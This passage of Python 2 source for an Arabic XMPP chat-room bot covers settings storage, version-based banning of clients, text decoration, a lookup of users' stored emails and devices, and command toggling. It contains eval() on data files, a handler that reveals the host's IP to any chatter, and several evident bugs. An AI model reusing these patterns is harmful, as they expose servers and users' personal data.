  if not x in MUC_AR_EN: MUC_AR_EN[x]={}   
  if 1 !=2:
   if p not in MUC_AR_EN[x]:	 
       MUC_AR_EN[x]=[p]
       write_file(MUC_AR_EN_FILE, str(MUC_AR_EN))  
   else: continue

def new23(p):
 for x in GROUPCHATS:
  if not x in MUC_FCON: MUC_FCON[x]={} 
  if not "len" in MUC_FCON[x]: MUC_FCON[x]["len"]={}   
  if 1 !=2:
   if p not in MUC_FCON[x]["len"]:	 
       MUC_FCON[x]["len"]=p
       write_file(MUC_FCONX_FILE, str(MUC_FCON))  
   else: continue


def new22(p):
 for x in GROUPCHATS:
  if not x in MUC_MSG: MUC_MSG[x]={} 
  if not "cans" in MUC_MSG[x]: MUC_MSG[x]["cans"]={}   
  if 1 !=2:
   if p not in MUC_MSG[x]["cans"]:	 
       MUC_MSG[x]["cans"]=p
       write_file(MUC_MSG_FILE, str(MUC_MSG))  
   else: continue


def new21(p):
 for x in GROUPCHATS:
  if not x in MUC_adb: MUC_adb[x]={} 
  if not "adblock" in MUC_adb[x]: MUC_adb[x]["adblock"]={}   
  if 1 !=2:
   if p not in MUC_adb[x]["adblock"]:	 
       MUC_adb[x]["adblock"]=p
       write_file(MUC_adb_FILE, str(MUC_adb))  
   else: continue

def new20(p):
 for x in GROUPCHATS:
  if not x in MUC_answer: MUC_answer[x]={} 
  if not "answer" in MUC_answer[x]: MUC_answer[x]["answer"]={}   
  if 1 !=2:
   if p not in MUC_answer[x]["answer"]:	 
       MUC_answer[x]["answer"]=p
       write_file(MUC_answer_FILE, str(MUC_answer))  
   else: continue
   
def new19(p):
 for x in GROUPCHATS:
  if not x in MUC_rep: MUC_rep[x]={} 
  if not "rep" in MUC_rep[x]: MUC_rep[x]["rep"]={}   
  if 1 !=2:
   if p not in MUC_rep[x]["rep"]:	 
       MUC_rep[x]["rep"]=p
       write_file(MUC_rep_FILE, str(MUC_rep))  
   else: continue
   
def new18(p):
 for x in GROUPCHATS:
  if not x in MUC_speed: MUC_speed[x]={} 
  if not "speed" in MUC_speed[x]: MUC_speed[x]["speed"]={}   
  if 1 !=2:
   if p not in MUC_speed[x]["speed"]:	 
       MUC_speed[x]["speed"]=p
       write_file(MUC_speed_FILE, str(MUC_speed))  
   else: continue
	
def new17(p):
 for x in GROUPCHATS:
  if not x in MUC_statusz: MUC_statusz[x]={} 
  if not "statusz" in MUC_statusz[x]: MUC_statusz[x]["statusz"]={}   
  if 1 !=2:
   if p not in MUC_statusz[x]["statusz"]:	 
       MUC_statusz[x]["statusz"]=p
       write_file(MUC_statusz_FILE, str(MUC_statusz))  
   else: continue
   	
def new16(p):
 for x in GROUPCHATS:
  if not x in MUC_statusr: MUC_statusr[x]={} 
  if not "statusr" in MUC_statusr[x]: MUC_statusr[x]["statusr"]={}   
  if 1 !=2:
   if p not in MUC_statusr[x]["statusr"]:	 
       MUC_statusr[x]["statusr"]=p
       write_file(MUC_statusr_FILE, str(MUC_statusr))  
   else: continue				
def new15(p):
 for x in GROUPCHATS:
  if not x in MUC_status: MUC_status[x]={} 
  if not "status" in MUC_status[x]: MUC_status[x]["status"]={}   
  if 1 !=2:
   if p not in MUC_status[x]["status"]:	 
       MUC_status[x]["status"]=p
       write_file(MUC_status_FILE, str(MUC_status))  
   else: continue
   	
def new14(p):
 for x in GROUPCHATS:
  if not x in MUC_nick: MUC_nick[x]={} 
  if not "nick" in MUC_nick[x]: MUC_nick[x]["nick"]={}   
  if 1 !=2:
   if p not in MUC_nick[x]["nick"]:	 
       MUC_nick[x]["nick"]=p
       write_file(MUC_nick_FILE, str(MUC_nick))  
   else: continue

def new13(p):
 for x in GROUPCHATS:
  if not x in MUC_res: MUC_res[x]={} 
  if not "res" in MUC_res[x]: MUC_res[x]["res"]={}   
  if 1 !=2:
   if p not in MUC_res[x]["res"]:	 
       MUC_res[x]["res"]=p
       write_file(MUC_res_FILE, str(MUC_res))  
   else: continue
   
def new12(p):
 for x in GROUPCHATS:
  if not x in MUC_nickr: MUC_nickr[x]={} 
  if not "nickr" in MUC_nickr[x]: MUC_nickr[x]["nickr"]={}   
  if 1 !=2:
   if p not in MUC_nickr[x]["nickr"]:	 
       MUC_nickr[x]["nickr"]=p
       write_file(MUC_nickr_FILE, str(MUC_nickr))  
   else: continue
   

def new11(p):
 for x in GROUPCHATS:
  if not x in MUC_nickz: MUC_nickz[x]={} 
  if not "nickz" in MUC_nickz[x]: MUC_nickz[x]["nickz"]={}   
  if 1 !=2:
   if p not in MUC_nickz[x]["nickz"]:	 
       MUC_nickz[x]["nickz"]=p
       write_file(MUC_nickz_FILE, str(MUC_nickz))  
   else: continue
   
def new10(p):
 for x in GROUPCHATS:
  if not x in FAST_JOIN: FAST_JOIN[x]={} 
  if not "JOIN" in FAST_JOIN[x]: FAST_JOIN[x]["JOIN"]={}   
  if 1 !=2:
   if p not in FAST_JOIN[x]["JOIN"]:	 
       FAST_JOIN[x]["JOIN"]=p
       write_file(FAST_JOIN_FILE, str(FAST_JOIN))  
   else: continue

def new9(p):
 for x in GROUPCHATS:
  if not x in MUC_FCON8: MUC_FCON8[x]={} 
  if not "len" in MUC_FCON8[x]: MUC_FCON8[x]["len"]={}   
  if 1 !=2:
   if p not in MUC_FCON8[x]["len"]:	 
       MUC_FCON8[x]["len"]=p
       write_file(MUC_FCONX8_FILE, str(MUC_FCON8))  
   else: continue
   

				
def new8(p):
 for x in GROUPCHATS:
  if not x in MUC_SPAM2: MUC_SPAM2[x]={} 
  if not "spam2" in MUC_SPAM2[x]: MUC_SPAM2[x]["spam2"]={}   
  if 1 !=2:
   if p not in MUC_SPAM2[x]["spam2"]:	 
       MUC_SPAM2[x]["spam2"]=p
       write_file(MUC_SPAM2_FILE, str(MUC_SPAM2))  
   else: continue

def new7(p):
 for x in GROUPCHATS:
  if not x in SPACE_MSGX: SPACE_MSGX[x]={} 
  if not "space" in SPACE_MSGX[x]: SPACE_MSGX[x]["space"]={}   
  if 1 !=2:
   if p not in SPACE_MSGX[x]["space"]:	 
       SPACE_MSGX[x]["space"]=p
       write_file(SPACE_MSGX_FILE, str(SPACE_MSGX))  
   else: continue

def new6(p):
 for x in GROUPCHATS:
  if not x in NONE_MSGXX: NONE_MSGXX[x]={} 
  if not "none" in NONE_MSGXX[x]: NONE_MSGXX[x]["none"]={}   
  if 1 !=2:
   if p not in NONE_MSGXX[x]["none"]:	 
       NONE_MSGXX[x]["none"]=p
       write_file(NONE_MSGXX_FILE, str(NONE_MSGXX))  
   else: continue

def new3(p):
 for x in GROUPCHATS:
  if not x in MUC_MSG9: MUC_MSG9[x]={} 
  if not "cans" in MUC_MSG9[x]: MUC_MSG9[x]["cans"]={}   
  if 1 !=2:
   if p not in MUC_MSG9[x]["cans"]:	 
       MUC_MSG9[x]["cans"]=p
       write_file(MUC_MSG9_FILE, str(MUC_MSG9))  
   else: continue	
def new4(p):  
 for x in GROUPCHATS:
  if not x in MUC_nickss: MUC_nickss[x]={} 
  if not "nickss" in MUC_nickss[x]: MUC_nickss[x]["nickss"]={}   
  if 1 !=2:
   if p not in MUC_nickss[x]["nickss"]:	 
       MUC_nickss[x]["nickss"]=p
       write_file(MUC_nickss_FILE, str(MUC_nickss))  
   else: continue	   
def new5(p):   
 for x in GROUPCHATS:
  if not x in MUC_nickzz: MUC_nickzz[x]={} 
  if not "nickzz" in MUC_nickzz[x]: MUC_nickzz[x]["nickzz"]={}   
  if 1 !=2:
   if p not in MUC_nickzz[x]["nickzz"]:	 
       MUC_nickzz[x]["nickzz"]=p
       write_file(MUC_nickzz_FILE, str(MUC_nickzz))  
   else: continue	   
   
 
   
   
import socket
def hnd_melody_new_test(type, source, parameters):
 if type == 'chat':	
  realip = socket.gethostbyname(socket.getfqdn())
  reply(type, source, realip)   
register(hnd_melody_new_test, "pres11", 0)	
#################################
##OS
Arabic2 = ['ا','ب','ت','ث','ج','ح','خ','د','ذ','ر','ز','س','ش','ص','ض','ط','ظ','ع','غ','ف','ق','ك','ل','م','ن','ه','و','ي','آ','ة','أ','إ','ئ','ء','ؤ','ى']

def banos_join_melody(g, n, r, afl, cljid):
 global BANOS
 global GBANOS 
 if not g in BANOS:
  BANOS[g]={} 
 if not g in BANOS_2:
  BANOS_2[g]={}     
 if not g in MUC_noisy:
  MUC_noisy[g]={}   
 if n == get_bot_nick(g):
  return
 else:
  packet = IQ(CLIENTS[cljid], 'get')
  q = packet.addElement('query', 'jabber:iq:version')
  packet.addCallback(version_result_banos_melody, g, n, cljid)
  reactor.callFromThread(packet.send, g+'/'+n)
 if "on" in MUC_noisy[g].keys():
  msg(cljid,g,Xnoisy[4]%(n))	  
def sss(chat,jid,resource,cljid):
  if not chat in BANOS:
   BANOS[chat]={} 
  packet = IQ(CLIENTS[cljid], 'get')
  q = packet.addElement('query', 'jabber:iq:version')
  packet.addCallback(version_result_banos_melody1,chat,jid,resource, cljid)
  reactor.callFromThread(packet.send, jid+"/"+resource)	

def version_result_banos_melody1(chat,jid,resource,cljid, x):
 if x['type'] == 'error':
  pass
 else:
  query = element2dict(x)['query']
  r = element2dict(query)
  os = str(r.get('os')) 
  u=os.split()  
  for x in BANOS[chat].keys():
 #  if x.lower() in os.lower():
     if "حجب".decode('utf8') in BANOS[chat][x].keys():
      NAWRS1[chat][jid]['os']+=1
      NAWRS1[chat][jid]['band']=os	 
      NAWRS1[chat][jid]['msg']="".join(BANOS[chat][x]["حجب".decode('utf8')].keys())	
      write_file(NAWRS1_FILE, str(NAWRS1))		  
     return  
  if " " in u[0]:
   NAWRS1[chat][jid]['os']+=1
   NAWRS1[chat][jid]['band']=os		
   NAWRS1[chat][jid]['msg']=XFiltMSG[2] 
   write_file(NAWRS1_FILE, str(NAWRS1))	   
   to_admin('تم اكتشاف برنامج مخفي :\n الروم هي | '+chat+"\nالحساب هو | "+jid+"\nالنسخة هي | "+os)    
   return    
  for x in GBANOS:    
#   if x.lower() in os.lower():
    if "حجب".decode('utf8') in GBANOS[x].keys():   
      NAWRS1[chat][jid]['os']+=1
      NAWRS1[chat][jid]['band']=os	 
      NAWRS1[chat][jid]['msg']="".join(GBANOS[x]["حجب".decode('utf8')].keys())
      write_file(NAWRS1_FILE, str(NAWRS1))		  
    return  	
  if "yes" in OS_Arabic:	
   for x in os:   
    if x in Arabic2:
     NAWRS1[chat][jid]['os']+=1
     NAWRS1[chat][jid]['band']="None"		
     NAWRS1[chat][jid]['msg']=XFiltMSG[2]
     write_file(NAWRS1_FILE, str(NAWRS1))		
     to_admin(u'تم اكتشاف برنامج باللغة العربية:\n الروم هي | '+chat+"\nالحساب هو | "+jid+"\nالنسخة هي | "+os)   
     return 	
  if len(os) < MIN_OS:
    NAWRS1[chat][jid]['os']+=1
    NAWRS1[chat][jid]['band']="(نسخة قصيرة)"		
    NAWRS1[chat][jid]['msg']="(نسخة قصيرة)"
    write_file(NAWRS1_FILE, str(NAWRS1))		 
    return 		
  if len(os) > MAX_OS:
    NAWRS1[chat][jid]['os']+=1
    NAWRS1[chat][jid]['band']="(نسخة طويلة)"		
    NAWRS1[chat][jid]['msg']="(نسخة طويلة)"
    write_file(NAWRS1_FILE, str(NAWRS1))		 
    return 	
	
def version_result_banos_melody(g, n, cljid, x):
 tt=get_true_jid(g+'/'+n)
 if x['type'] == 'error':
     pass
 else:
  #query = element2dict(x)['query']
  #r = element2dict(query)
  try:
   os = str(r.get('os'))
   version = str(r.get('version'))    
   if " yes" in NEW_BAD_OS:
    if os == "":  
      room_access88(cljid, g, get_true_jid(g+'/'+n), "نسخة ممنوعة", "outcast", "affiliation", "jid")
    elif os == "None":
     room_access88(cljid, g, get_true_jid(g+'/'+n), "نسخة ممنوعة", "outcast", "affiliation", "jid")
   
  except: pass
  for x in BANOS[g].keys():
  # if x.lower() in os.lower():
    if "فصل".decode('utf8') in BANOS[g][x].keys():
     room_access88(cljid, g, get_true_jid(g+'/'+n), "".join(BANOS[g][x]["فصل".decode('utf8')].keys()), "outcast", "affiliation", "jid")
    if "طرد".decode('utf8') in BANOS[g][x].keys():
     room_access88(cljid, g, n, "".join(BANOS[g][x]["طرد".decode('utf8')].keys()), "none", "role" , "nick")
    if "حجب".decode('utf8') in BANOS[g][x].keys():
     room_access88(cljid, g, n, "".join(BANOS[g][x]["حجب".decode('utf8')].keys()), "none", "role" , "nick")
     try:	 
      NAWRS1[g][tt]['ok']+=1
      NAWRS1[g][tt]['os']+=1 
      NAWRS1[g][tt]['band']=os	
      NAWRS1[g][tt]['msg']="".join(BANOS[g][x]["حجب".decode('utf8')].keys())
      write_file(NAWRS1_FILE, str(NAWRS1))		  
     except: pass	 
  for x in BANOS_2[g].keys():
 #  if x.lower() in version.lower():
    if "فصل".decode('utf8') in BANOS_2[g][x].keys():
     room_access88(cljid, g, get_true_jid(g+'/'+n), "".join(BANOS_2[g][x]["فصل".decode('utf8')].keys()), "outcast", "affiliation", "jid")
    if "طرد".decode('utf8') in BANOS_2[g][x].keys():
     room_access88(cljid, g, n, "".join(BANOS_2[g][x]["طرد".decode('utf8')].keys()), "none", "role" , "nick")
    if "حجب".decode('utf8') in BANOS_2[g][x].keys():
     room_access88(cljid, g, n, "".join(BANOS_2[g][x]["حجب".decode('utf8')].keys()), "none", "role" , "nick")
     try:	 
      NAWRS1[g][tt]['ok']+=1
      NAWRS1[g][tt]['os']+=1 
      NAWRS1[g][tt]['band']=os	
      NAWRS1[g][tt]['msg']="".join(BANOS_2[g][x]["حجب".decode('utf8')].keys())
      write_file(NAWRS1_FILE, str(NAWRS1))		  
     except: pass		 
	 
  for x in GBANOS:    
#   if x.lower() in os.lower():
    if "فصل".decode('utf8') in GBANOS[x].keys():
     room_access88(cljid, g, get_true_jid(g+'/'+n), "".join(GBANOS[x]["فصل".decode('utf8')].keys()), "outcast", "affiliation", "jid")
    if "طرد".decode('utf8') in GBANOS[x].keys():
     room_access88(cljid, g, n, "".join(GBANOS[x]["طرد".decode('utf8')].keys()), "none", "role" , "nick")  
    if "حجب".decode('utf8') in GBANOS[x].keys():
     room_access88(cljid, g, n, "".join(GBANOS[x]["حجب".decode('utf8')].keys()), "none", "role" , "nick") 
     try:	 
      NAWRS1[g][tt]['ok']+=1
      NAWRS1[g][tt]['os']+=1 
      NAWRS1[g][tt]['band']=os	
      NAWRS1[g][tt]['msg']="".join(GBANOS[x]["حجب".decode('utf8')].keys())
      write_file(NAWRS1_FILE, str(NAWRS1))		  
     except: pass 	 
register_join_handler(banos_join_melody)

def room_access88(cljid, g, user, msg66 , order , moder, nickx):
 packet = IQ(CLIENTS[cljid], 'set')
 query = packet.addElement('query', 'http://jabber.org/protocol/muc#admin')
 i = query.addElement('item')
 i[nickx] = user
 i[moder] = order
 i.addElement('reason').addContent(msg66)
 reactor.callFromThread(packet.send, g)    
##OS

######################################################
######################################################
#زخرفة
tpex=XEmboss[2]

newtre=XEmboss[1]

def Emboss(t, s, p):
 f=''
 if not s[1] in GROUPCHATS: return
 if not p:
  reply(t, s, s[2]+' : '+'\n'+XEmboss[3])  
 else: 
    msg='' 
    melody_r= random.choice(newtre)
    melody_r2= random.choice(newtre)
    melody_r3= random.choice(newtre)
    melody_r4= random.choice(newtre)
    melody_r5= random.choice(newtre)	
    y1=p.replace("a",tpex["a"][1]).replace("t",tpex["t"][1]).replace("b",tpex["b"][1]).replace("c",tpex["c"][1]).replace("d",tpex["d"][1]).replace("e",tpex["e"][1]).replace("f",tpex["f"][1]).replace("g",tpex["g"][1]).replace("h",tpex["h"][1]).replace("i",tpex["i"][1]).replace("j",tpex["j"][1]).replace("k",tpex["k"][1]).replace("l",tpex["l"][1]).replace("m",tpex["m"][1]).replace("n",tpex["n"][1]).replace("o",tpex["o"][1]).replace("p",tpex["p"][1]).replace("q",tpex["q"][1]).replace("r",tpex["r"][1]).replace("s",tpex["s"][1]).replace("u",tpex["u"][1]).replace("v",tpex["v"][1]).replace("w",tpex["w"][1]).replace("x",tpex["x"][1]).replace("y",tpex["y"][1]).replace("z",tpex["z"][1]).replace("1",tpex["1"][1]).replace("2",tpex["2"][1]).replace("3",tpex["3"][1]).replace("4",tpex["4"][1]).replace("5",tpex["5"][1]).replace("6",tpex["6"][1]).replace("7",tpex["7"][1]).replace("8",tpex["8"][1]).replace("9",tpex["9"][1]).replace("0",tpex["0"][1]).replace("ا",tpex["ا"][1]).replace("أ",tpex["أ"][1]).replace("ء",tpex["ء"][1]).replace("ب",tpex["ب"][1]).replace("ت",tpex["ت"][1]).replace("ث",tpex["ث"][1]).replace("ج",tpex["ج"][1]).replace("ح",tpex["ح"][1]).replace("خ",tpex["خ"][1]).replace("د",tpex["د"][1]).replace("ذ",tpex["ذ"][1]).replace("ر",tpex["ر"][1]).replace("ز",tpex["ز"][1]).replace("س",tpex["س"][1]).replace("ش",tpex["ش"][1]).replace("ص",tpex["ص"][1]).replace("ض",tpex["ض"][1]).replace("ط",tpex["ط"][1]).replace("ظ",tpex["ظ"][1]).replace("ع",tpex["ع"][1]).replace("غ",tpex["غ"][1]).replace("ف",tpex["ف"][1]).replace("ق",tpex["ق"][1]).replace("و",tpex["و"][1]).replace("ي",tpex["ي"][1]).replace("ى",tpex["ى"][1]).replace("ئ",tpex["ئ"][1]).replace("ؤ",tpex["ؤ"][1]).replace("ك",tpex["ك"][1]).replace("ل",tpex["ل"][1]).replace("م",tpex["م"][1]).replace("ن",tpex["ن"][1]).replace("ه",tpex["ه"][1])
    msg+="\n دعني اقدم لك عدة انواع من الزخرفة لعلها تعجبك : "+"\n| 1 |  "+melody_r+y1+melody_r
    y2=p.replace("t",tpex["t"][2]).replace("a",tpex["a"][2]).replace("b",tpex["b"][2]).replace("c",tpex["c"][2]).replace("d",tpex["d"][2]).replace("e",tpex["e"][2]).replace("f",tpex["f"][2]).replace("g",tpex["g"][2]).replace("h",tpex["h"][2]).replace("i",tpex["i"][2]).replace("j",tpex["j"][2]).replace("k",tpex["k"][2]).replace("l",tpex["l"][2]).replace("m",tpex["m"][2]).replace("n",tpex["n"][2]).replace("o",tpex["o"][2]).replace("p",tpex["p"][2]).replace("q",tpex["q"][2]).replace("r",tpex["r"][2]).replace("s",tpex["s"][2]).replace("u",tpex["u"][2]).replace("v",tpex["v"][2]).replace("w",tpex["w"][2]).replace("x",tpex["x"][2]).replace("y",tpex["y"][2]).replace("z",tpex["z"][2]).replace("1",tpex["1"][2]).replace("2",tpex["2"][2]).replace("3",tpex["3"][2]).replace("4",tpex["4"][2]).replace("5",tpex["5"][2]).replace("6",tpex["6"][2]).replace("7",tpex["7"][2]).replace("8",tpex["8"][2]).replace("9",tpex["9"][2]).replace("0",tpex["0"][2]).replace("ا",tpex["ا"][2]).replace("أ",tpex["أ"][2]).replace("ء",tpex["ء"][2]).replace("ب",tpex["ب"][2]).replace("ت",tpex["ت"][2]).replace("ث",tpex["ث"][2]).replace("ج",tpex["ج"][2]).replace("ح",tpex["ح"][2]).replace("خ",tpex["خ"][2]).replace("د",tpex["د"][2]).replace("ذ",tpex["ذ"][2]).replace("ر",tpex["ر"][2]).replace("ز",tpex["ز"][2]).replace("س",tpex["س"][2]).replace("ش",tpex["ش"][2]).replace("ص",tpex["ص"][2]).replace("ض",tpex["ض"][2]).replace("ط",tpex["ط"][2]).replace("ظ",tpex["ظ"][2]).replace("ع",tpex["ع"][2]).replace("غ",tpex["غ"][2]).replace("ف",tpex["ف"][2]).replace("ق",tpex["ق"][2]).replace("و",tpex["و"][2]).replace("ي",tpex["ي"][2]).replace("ى",tpex["ى"][2]).replace("ئ",tpex["ئ"][2]).replace("ؤ",tpex["ؤ"][2]).replace("ك",tpex["ك"][2]).replace("ل",tpex["ل"][2]).replace("م",tpex["م"][2]).replace("ن",tpex["ن"][2]).replace("ه",tpex["ه"][2])
    msg+="\n| 2 |  "+melody_r2+y2+melody_r2
    y3=p.replace("t",tpex["t"][3]).replace("a",tpex["a"][3]).replace("b",tpex["b"][3]).replace("c",tpex["c"][3]).replace("d",tpex["d"][3]).replace("e",tpex["e"][3]).replace("f",tpex["f"][3]).replace("g",tpex["g"][3]).replace("h",tpex["h"][3]).replace("i",tpex["i"][3]).replace("j",tpex["j"][3]).replace("k",tpex["k"][3]).replace("l",tpex["l"][3]).replace("m",tpex["m"][3]).replace("n",tpex["n"][3]).replace("o",tpex["o"][3]).replace("p",tpex["p"][3]).replace("q",tpex["q"][3]).replace("r",tpex["r"][3]).replace("s",tpex["s"][3]).replace("u",tpex["u"][3]).replace("v",tpex["v"][3]).replace("w",tpex["w"][3]).replace("x",tpex["x"][3]).replace("y",tpex["y"][3]).replace("z",tpex["z"][3]).replace("1",tpex["1"][3]).replace("2",tpex["2"][3]).replace("3",tpex["3"][3]).replace("4",tpex["4"][3]).replace("5",tpex["5"][3]).replace("6",tpex["6"][3]).replace("7",tpex["7"][3]).replace("8",tpex["8"][3]).replace("9",tpex["9"][3]).replace("0",tpex["0"][3]).replace("ا",tpex["ا"][3]).replace("أ",tpex["أ"][3]).replace("ء",tpex["ء"][3]).replace("ب",tpex["ب"][3]).replace("ت",tpex["ت"][3]).replace("ث",tpex["ث"][3]).replace("ج",tpex["ج"][3]).replace("ح",tpex["ح"][3]).replace("خ",tpex["خ"][3]).replace("د",tpex["د"][3]).replace("ذ",tpex["ذ"][3]).replace("ر",tpex["ر"][3]).replace("ز",tpex["ز"][3]).replace("س",tpex["س"][3]).replace("ش",tpex["ش"][3]).replace("ص",tpex["ص"][3]).replace("ض",tpex["ض"][3]).replace("ط",tpex["ط"][3]).replace("ظ",tpex["ظ"][3]).replace("ع",tpex["ع"][3]).replace("غ",tpex["غ"][3]).replace("ف",tpex["ف"][3]).replace("ق",tpex["ق"][3]).replace("و",tpex["و"][3]).replace("ي",tpex["ي"][3]).replace("ى",tpex["ى"][3]).replace("ئ",tpex["ئ"][3]).replace("ؤ",tpex["ؤ"][3]).replace("ك",tpex["ك"][3]).replace("ل",tpex["ل"][3]).replace("م",tpex["م"][3]).replace("ن",tpex["ن"][3]).replace("ه",tpex["ه"][3])
    msg+="\n| 3 |  "+melody_r3+y3+melody_r3
    y4=p.replace("t",tpex["t"][4]).replace("a",tpex["a"][4]).replace("b",tpex["b"][4]).replace("c",tpex["c"][4]).replace("d",tpex["d"][4]).replace("e",tpex["e"][4]).replace("f",tpex["f"][4]).replace("g",tpex["g"][4]).replace("h",tpex["h"][4]).replace("i",tpex["i"][4]).replace("j",tpex["j"][4]).replace("k",tpex["k"][4]).replace("l",tpex["l"][4]).replace("m",tpex["m"][4]).replace("n",tpex["n"][4]).replace("o",tpex["o"][4]).replace("p",tpex["p"][4]).replace("q",tpex["q"][4]).replace("r",tpex["r"][4]).replace("s",tpex["s"][4]).replace("u",tpex["u"][4]).replace("v",tpex["v"][4]).replace("w",tpex["w"][4]).replace("x",tpex["x"][4]).replace("y",tpex["y"][4]).replace("z",tpex["z"][4]).replace("1",tpex["1"][4]).replace("2",tpex["2"][4]).replace("3",tpex["3"][4]).replace("4",tpex["4"][4]).replace("5",tpex["5"][4]).replace("6",tpex["6"][4]).replace("7",tpex["7"][4]).replace("8",tpex["8"][4]).replace("9",tpex["9"][4]).replace("0",tpex["0"][4]).replace("ا",tpex["ا"][4]).replace("أ",tpex["أ"][4]).replace("ء",tpex["ء"][4]).replace("ب",tpex["ب"][4]).replace("ت",tpex["ت"][4]).replace("ث",tpex["ث"][4]).replace("ج",tpex["ج"][4]).replace("ح",tpex["ح"][4]).replace("خ",tpex["خ"][4]).replace("د",tpex["د"][4]).replace("ذ",tpex["ذ"][4]).replace("ر",tpex["ر"][4]).replace("ز",tpex["ز"][4]).replace("س",tpex["س"][4]).replace("ش",tpex["ش"][4]).replace("ص",tpex["ص"][4]).replace("ض",tpex["ض"][4]).replace("ط",tpex["ط"][4]).replace("ظ",tpex["ظ"][4]).replace("ع",tpex["ع"][4]).replace("غ",tpex["غ"][4]).replace("ف",tpex["ف"][4]).replace("ق",tpex["ق"][4]).replace("و",tpex["و"][4]).replace("ي",tpex["ي"][4]).replace("ى",tpex["ى"][4]).replace("ئ",tpex["ئ"][4]).replace("ؤ",tpex["ؤ"][4]).replace("ك",tpex["ك"][4]).replace("ل",tpex["ل"][4]).replace("م",tpex["م"][4]).replace("ن",tpex["ن"][4]).replace("ه",tpex["ه"][4])
    msg+="\n| 4 |  "+melody_r4+y4+melody_r4
    y5=p.replace("t",tpex["t"][5]).replace("a",tpex["a"][5]).replace("b",tpex["b"][5]).replace("c",tpex["c"][5]).replace("d",tpex["d"][5]).replace("e",tpex["e"][5]).replace("f",tpex["f"][5]).replace("g",tpex["g"][5]).replace("h",tpex["h"][5]).replace("i",tpex["i"][5]).replace("j",tpex["j"][5]).replace("k",tpex["k"][5]).replace("l",tpex["l"][5]).replace("m",tpex["m"][5]).replace("n",tpex["n"][5]).replace("o",tpex["o"][5]).replace("p",tpex["p"][5]).replace("q",tpex["q"][5]).replace("r",tpex["r"][5]).replace("s",tpex["s"][5]).replace("u",tpex["u"][5]).replace("v",tpex["v"][5]).replace("w",tpex["w"][5]).replace("x",tpex["x"][5]).replace("y",tpex["y"][5]).replace("z",tpex["z"][5]).replace("1",tpex["1"][5]).replace("2",tpex["2"][5]).replace("3",tpex["3"][5]).replace("4",tpex["4"][5]).replace("5",tpex["5"][5]).replace("6",tpex["6"][5]).replace("7",tpex["7"][5]).replace("8",tpex["8"][5]).replace("9",tpex["9"][5]).replace("0",tpex["0"][5]).replace("ا",tpex["ا"][5]).replace("أ",tpex["أ"][5]).replace("ء",tpex["ء"][5]).replace("ب",tpex["ب"][5]).replace("ت",tpex["ت"][5]).replace("ث",tpex["ث"][5]).replace("ج",tpex["ج"][5]).replace("ح",tpex["ح"][5]).replace("خ",tpex["خ"][5]).replace("د",tpex["د"][5]).replace("ذ",tpex["ذ"][5]).replace("ر",tpex["ر"][5]).replace("ز",tpex["ز"][5]).replace("س",tpex["س"][5]).replace("ش",tpex["ش"][5]).replace("ص",tpex["ص"][5]).replace("ض",tpex["ض"][5]).replace("ط",tpex["ط"][5]).replace("ظ",tpex["ظ"][5]).replace("ع",tpex["ع"][5]).replace("غ",tpex["غ"][5]).replace("ف",tpex["ف"][5]).replace("ق",tpex["ق"][5]).replace("و",tpex["و"][5]).replace("ي",tpex["ي"][5]).replace("ى",tpex["ى"][5]).replace("ئ",tpex["ئ"][5]).replace("ؤ",tpex["ؤ"][5]).replace("ك",tpex["ك"][5]).replace("ل",tpex["ل"][5]).replace("م",tpex["م"][5]).replace("ن",tpex["ن"][5]).replace("ه",tpex["ه"][5])
    msg+="\n| 5 |  "+melody_r5+y5+melody_r5	
    reply(t, s, s[2]+' : '+'\n'+msg)	
register(Emboss, XEmboss[0], 0)  

######################################################
######################################################
# تفاصيل
def Details3(t, s, p):
        foo=[]
        f=''		
        if "no" in DeTails:
                reply(type, source, Details2[1])
                
        else:
                if not s[1] in GROUPCHATS:
                        return
                file='rooms-data/'+s[1]+'/Details.py'
                try:
                
                        uslog1 = eval(read_file(file))
                except:
                        pass               

                if not p:
                      reply(t, s, s[2]+' : '+Details2[2])#Details2[1]  
              
                else:
                  if p in uslog1:
                   foo.append("\n♡ الالقاب الخاصة بهذا الحساب هي ♡\n")  
                   for x in uslog1[p].keys():
                    for i in uslog1[p][x].keys():
                     foo.append(""+i) 	
                   f = ''.join(foo)
                   if t in ['groupchat']:		
                    reply(t,s,s[2]+' : '+"تم ارسال البيانات الى الخاص نظرا لطول الرسالة") 
                   reply('chat', s, s[2]+' : '+"\n"+f+"\nـــــــــــــــــــــــــــــــــــــــــــــــــــــ\n\n♡ الايميل الخاص بهذا الشخص هو ♡\n"+p+"\nـــــــــــــــــــــــــــــــــــــــــــــــــــــ\n\n الجهاز الخاص بهذا الشخص هو \n"+x) 
                  else:		
                        col=1				  
                        for x in uslog1:   
                         for y in uslog1[x]:
                          for i in uslog1[x][y]:
                           if p in i:
                              foo.append("\n              ♡♡♡"+'بيانات جزء رقم '+'( '+str(col)+' )'+"♡♡♡ \n          ـــــــــــــــــــــــــــــــــــــــــــــــــــــ") 						   
                              foo.append("\n♡ الايميل الخاص بهذا الشخص هو ♡\n"+x) 		
                              col=col+1							  
                              for u in uslog1[x].keys(): 
                               foo.append("ـــــــــــــــــــــــــــــــــــــــــــــــــــــ\n\n♡ الجهاز الخاص بهذا الشخص هو ♡\n "+u+"\nـــــــــــــــــــــــــــــــــــــــــــــــــــــ\n\n♡ الالقاب الخاصة بهذا الشخص هي ♡\n") 								  
                               for yy in uslog1[x][y].keys():
                                foo.append(""+str(yy))
					   
                        f = ''.join(foo)
                        if len(f):	
                          if t in ['groupchat']:		
                           reply(t,s,s[2]+' : '+"تم ارسال البيانات الى الخاص نظرا لطول الرسالة") 						 
                          reply('chat', s, s[2]+' : '+"\n"+f)    
                        else: reply(t,s,s[2]+' : '+'\n'+Details2[3])
register(Details3, Details2[0], 20)
######################################################
######################################################
#ايقاف امر
# -*- coding: utf-8 -*-
def handler_commoff(type,s,p):
        if not s[1] in GROUPCHATS:
                reply(type, s, s[2]+' : '+Xcommo[6])
                return
        file='rooms-data/'+s[1]+'/commoff.py'
        get_commoff(s[1])
        na=[Xcommo[0],Xcommo[1]]
        if p:
                if not p in COMMAND1S:
                        reply(type, s, s[2]+' : '+Xcommo[2])
                        return
                if p in na:
                        reply(type, s, s[2]+' : '+Xcommo[3])
                        return
                if p in COMMOFF[s[1]]:
                        reply(type, s, s[2]+' : '+Xcommo[4])
                        return
                db=eval(read_file(file))
                db[p]={}
                write_file(file, str(db))
                reply(type, s, s[2]+' : '+Xcommo[5]+p)
                get_commoff(s[1])
        else:
                reply(type, s, s[2]+' : '+' | '.join(COMMOFF[s[1]].keys()))

def handler_common(type,s,p):
        if not s[1] in GROUPCHATS:
                reply(type, source, source[2]+' : '+Xcommo[6])
